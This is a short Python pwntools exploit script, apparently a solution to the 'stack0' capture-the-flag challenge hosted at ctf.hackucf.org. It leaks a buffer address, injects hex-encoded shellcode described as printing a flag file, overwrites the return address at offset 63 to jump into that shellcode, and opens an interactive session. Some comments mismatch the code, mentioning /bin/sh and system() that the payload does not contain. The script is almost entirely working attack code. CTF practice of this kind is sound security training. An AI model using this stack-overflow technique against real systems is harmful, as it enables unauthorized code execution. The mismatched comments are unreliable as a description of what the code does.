#!/bin/env python3
from pwn import *
from pwnlib.asm import * 
from pwnlib import shellcraft
import binascii

exe = context.binary = ELF('stack0')

io = remote('ctf.hackucf.org', 32101) #exe.process()
#shellcode of cat flag2.txt
hexcode = '6a7468322e747868666c616789e331c96a0558cd806a015b89c131d268ffffff7f5e31c0b0bbcd80'
io.recvuntil('buffer = ')
bufaddr = int(io.recvline().strip(), base=16)
offset = 63  # offset from start of buffer to return address
# Generate the shellcode that puts /bin/sh on the stack
shellcode = bytes.fromhex(hexcode)
# Append the code that calls system("/bin/sh")
payload = fit({
    0: shellcode,
    offset - 4: p32(bufaddr),
    offset: p32(bufaddr) * 4
})
io.recvuntil('program:')
#gdb.attach(io)
io.send(payload)
io.interactive()
